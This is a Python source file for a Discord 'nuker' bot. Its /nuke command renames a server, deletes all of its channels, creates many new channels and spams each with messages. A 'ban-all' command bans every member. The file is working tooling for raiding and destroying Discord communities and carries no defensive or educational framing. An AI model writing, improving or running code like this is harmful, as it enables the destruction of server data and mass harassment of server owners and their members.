import discord
import json
import os
import asyncio
import threading
from datetime import datetime
from pystyle import Colorate, Colors, Write
from discord.ext import commands
from discord import ui, app_commands
from colorama import Fore, Style, init

init(autoreset=True)
now = datetime.now()
tf = now.strftime('%H:%M:%S')

aascii = """
                                 ▄▄▄▄▄ ▀▄    ▄  ▄     ▄▄▄▄▀ ▄  █ ▄███▄     ▄▄▄▄▀ ▄█ ▄█▄
                                █     ▀▄ █  █    █ ▀▀▀ █   █   █ █▀   ▀ ▀▀▀ █    ██ █▀ ▀▄
                              ▄  ▀▀▀▀▄    ▀█ ██   █    █   ██▀▀█ ██▄▄       █    ██ █   ▀
                               ▀▄▄▄▄▀     █  █ █  █   █    █   █ █▄   ▄▀   █     ▐█ █▄  ▄▀
                                        ▄▀   █  █ █  ▀        █  ▀███▀    ▀       ▐ ▀███▀
                                             █   ██          ▀

"""

class Nuke(ui.Modal, title='Nuke Command Response'):
    What_to_spam = ui.TextInput(label='What would you like to spam?', placeholder="Nuked by User", style=discord.TextStyle.paragraph)
    channel_name = ui.TextInput(label="Channel Names", placeholder="Nuked by User")
    amount = ui.TextInput(label='Amount', placeholder="Ex: 20")

    async def on_submit(self, interaction: discord.Interaction):
        guild = interaction.guild
        await guild.edit(name="rescore.lol")
        what_to_spam = self.What_to_spam.value
        channel_name = self.channel_name.value
        amount = int(self.amount.value)

        existing_channels = [channel for channel in guild.channels]

        async def delete_channel(channel):
            try:
                await channel.delete()
            except discord.HTTPException as e:
                err(f"Failed to delete channel {channel.name}: {e}")

        async def create_channel(name):
            try:
                return await guild.create_text_channel(name)
            except discord.HTTPException as e:
                err(f"Failed to create channel {name}")
                return None

        async def spam_channel(channel, message, count):
            if channel:
                try:
                    for _ in range(count):
                        await channel.send(message)
                        await asyncio.sleep(0.1)
                except discord.HTTPException as e:
                    err(f"Failed to send message in channel {channel.name}: {e}")

        for channel in existing_channels:
            await delete_channel(channel)

        new_channels = []
        for i in range(amount):
            new_channel = await create_channel(f"{channel_name}_{i}")
            if new_channel:
                new_channels.append(new_channel)

        for channel in new_channels:
            await spam_channel(channel, what_to_spam, 20)

        embed = discord.Embed(
            title="✅ Finished Nuking Successfully!",
            description="The nuke command has been executed successfully.",
            color=0x00FF00
        )
        embed.set_author(name="Being Wizzed")

        await interaction.user.send(embed=embed)

def rn(x):
    if x == "err":
        return f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTWHITE_EX}{tf}{Fore.LIGHTMAGENTA_EX}]  \x1b[38;5;52mERROR {Fore.LIGHTMAGENTA_EX}> {Fore.RESET}"
    if x == "debug":
        return f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTWHITE_EX}{tf}{Fore.LIGHTMAGENTA_EX}]  {Fore.LIGHTWHITE_EX}SYNTHETIC {Fore.LIGHTMAGENTA_EX}> {Fore.RESET}"
    else:
        return f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTWHITE_EX}{tf}{Fore.LIGHTMAGENTA_EX}]  {Fore.LIGHTWHITE_EX}DEBUG {Fore.LIGHTMAGENTA_EX}> {Fore.RESET}"

class Console:
    def log(self, x, t="r"):
        print(f"{rn(t)} {x}")

def err(x):
    Console().log(x, "err")

def debug(x):
    Console().log(x, "debug")

def log(x):
    Console().log(x)

def load_config():
    if not os.path.isfile('config.json'):
        with open('config.json', 'w') as f:
            json.dump({"token": "", "prefix": ""}, f, indent=4)

    with open('config.json', 'r') as f:
        return json.load(f)

def save_config(config):
    with open('config.json', 'w') as f:
        json.dump(config, f, indent=4)

def welcome(config):
    os.system("cls")
    print(Colorate.Horizontal(Colors.yellow_to_red, aascii, 1))

    if not config["prefix"]:
        prefix = Write.Input("\n\nEnter your Prefix -> ", Colors.yellow_to_red, interval=0.0025)
        config["prefix"] = prefix
        save_config(config)

    if not config["token"]:
        token = Write.Input("\n\n\nEnter your Token -> ", Colors.yellow_to_red, interval=0.0025)
        config["token"] = token
        save_config(config)

    Write.Print(f"Attempting to login with token!\n", Colors.yellow_to_red, interval=0.05)
    return config["token"]

config = load_config()
token = welcome(config)

bot = commands.Bot(command_prefix=config["prefix"], intents=discord.Intents.all())
bot.remove_command("help")

@bot.hybrid_command(name="ban-all", description="Bans all members from a guild")
async def nuke(ctx):
    guild = ctx.guild
    members = [member async for member in guild.fetch_members(limit=None)]
    log("starting bans")

    async def ban_member(member):
        try:
            await member.ban(reason="Guild nuke by command")
        except discord.Forbidden:
            err(f"Cannot ban {member.display_name}, lacking permissions.")
        except discord.HTTPException:
            err(f"Failed to ban {member.display_name}.")

    tasks = [ban_member(member) for member in members]
    await asyncio.gather(*tasks)

    log("Banned all successfully")

@bot.tree.command(name="nuke")
async def nuke(interaction:discord.Interaction):
    await interaction.response.send_modal(Nuke())

@bot.event
async def on_ready():
    os.system("cls")
    await bot.tree.sync()
    print(Colorate.Horizontal(Colors.blue_to_cyan, aascii, 1))
    print(f"Logged in as {bot.user}")
    print("Restart Your Discord To see as the new slash commands!")

if __name__ == "__main__":
    try:
        os.system("cls")
        bot.run(token)
    except discord.errors.LoginFailure:
        err("Invalid Token")
        os.system("pause>")
